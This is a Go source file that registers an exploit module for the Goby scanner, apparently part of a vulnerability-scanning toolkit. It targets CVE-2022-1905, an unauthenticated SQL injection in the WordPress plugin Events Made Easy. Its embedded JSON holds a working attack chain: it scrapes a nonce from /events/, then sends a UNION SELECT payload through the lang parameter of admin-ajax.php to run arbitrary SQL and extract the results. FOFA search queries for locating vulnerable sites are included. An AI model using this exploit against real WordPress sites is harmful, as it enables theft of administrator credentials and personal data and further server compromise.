package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin Events Made Easy SQL Injection Vulnerability(CVE-2022-1905)",
    "Description": "<p>Events Made Easy is a full-featured event and membership management solution for WordPress.</p><p>Events Made Easy 2.2.81 has an unauthorized SQL injection vulnerability.</p>",
    "Product": "wordpress-plugin-events-made-easy",
    "Homepage": "https://wordpress.org/plugins/events-made-easy/",
    "DisclosureDate": "2022-05-30",
    "Author": "sunying",
    "FofaQuery": "body=\"wp-content/plugins/events-made-easy\"",
    "GobyQuery": "body=\"wp-content/plugins/events-made-easy\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://wordpress.org/plugins/events-made-easy/\">https://wordpress.org/plugins/events-made-easy/</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/ff5fd894-aff3-400a-8eec-fad9d50f788e"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "select+user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/events/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "translate_frontendnonce|lastbody|regex|translate_frontendnonce\":\"(.+?)\""
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=eme_select_country&eme_frontend_nonce={{{translate_frontendnonce}}}&lang=enen'++UNION+ALL+SELECT+NULL,(select+md5(123456)),NULL,NULL,NULL,NULL--+-'",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/events/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "translate_frontendnonce|lastbody|regex|translate_frontendnonce\":\"(.+?)\""
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=eme_select_country&eme_frontend_nonce={{{translate_frontendnonce}}}&lang=enen'++UNION+ALL+SELECT+NULL,({{{sql}}}),NULL,NULL,NULL,NULL--+-'",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"id\":\"(.+?)\""
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2022-1905"
    ],
    "CNNVD": [
        "CNNVD-202206-2033"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress Events Made Easy 插件 admin-ajax.php 文件 lang 参数SQL注入漏洞（CVE-2022-1905）",
            "Product": "wordpress-plugin-events-made-easy",
            "Description": "<p>Events Made Easy 是适用于 WordPress 的功能齐全的活动和会员管理解决方案。<br></p><p>Events Made Easy 2.2.81存在未授权SQL注入漏洞。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wordpress.org/plugins/events-made-easy/\">https://wordpress.org/plugins/events-made-easy/</a><br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。\t<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin Events Made Easy SQL Injection Vulnerability(CVE-2022-1905)",
            "Product": "wordpress-plugin-events-made-easy",
            "Description": "<p>Events Made Easy is a full-featured event and membership management solution for WordPress.</p><p>Events Made Easy 2.2.81 has an unauthorized SQL injection vulnerability.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://wordpress.org/plugins/events-made-easy/\">https://wordpress.org/plugins/events-made-easy/</a><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-06-07",
    "PocId": "10791"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}